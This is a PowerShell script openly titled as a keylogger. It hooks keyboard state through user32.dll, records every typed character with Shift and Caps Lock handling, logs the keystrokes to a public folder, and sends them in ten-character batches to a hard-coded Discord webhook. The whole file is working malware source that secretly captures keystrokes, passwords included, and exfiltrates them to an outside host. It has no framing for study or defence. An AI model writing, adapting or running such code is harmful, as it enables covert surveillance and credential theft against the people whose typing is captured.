# Keylogger with Discord by DreadCipher
$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyHook {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")]
    public static extern short GetKeyState(int vKey);
}
"@

$buffer = ""
$keyMap = @{
    48 = '0'; 49 = '1'; 50 = '2'; 51 = '3'; 52 = '4'; 53 = '5'; 54 = '6'; 55 = '7'; 56 = '8'; 57 = '9';
    65 = 'a'; 66 = 'b'; 67 = 'c'; 68 = 'd'; 69 = 'e'; 70 = 'f'; 71 = 'g'; 72 = 'h'; 73 = 'i'; 74 = 'j';
    75 = 'k'; 76 = 'l'; 77 = 'm'; 78 = 'n'; 79 = 'o'; 80 = 'p'; 81 = 'q'; 82 = 'r'; 83 = 's'; 84 = 't';
    85 = 'u'; 86 = 'v'; 87 = 'w'; 88 = 'x'; 89 = 'y'; 90 = 'z'; 32 = ' '; 190 = '.'; 188 = ','; 13 = "`n"
}
"Keylogger started at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append

while ($true) {
    Start-Sleep -Milliseconds 40
    foreach ($key in $keyMap.Keys) {
        if ([KeyHook]::GetAsyncKeyState($key) -eq -32767) {
            $shift = [KeyHook]::GetKeyState(0x10) -band 0x8000
            $caps = [Console]::CapsLock
            $baseChar = $keyMap[$key]
            $char = if ($key -ge 65 -and $key -le 90 -and ($shift -xor $caps)) { $baseChar.ToUpper() } else { $baseChar }
            
            $buffer += $char
            "Added '$char' ($key) to buffer: '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
            if ($buffer.Length -ge 10) {
                try {
                    $sendBuffer = $buffer.Substring(0, 10)
                    "Sending '$sendBuffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                    $payload = @{ content = "Typed: $sendBuffer" } | ConvertTo-Json
                    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
                    "Sent '$sendBuffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                    $buffer = $buffer.Substring(10)
                } catch {
                    "Error sending '$sendBuffer' at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                    $buffer = ""
                }
            }
            break  # Exit loop after first keypress to avoid duplicates
        }
    }
}
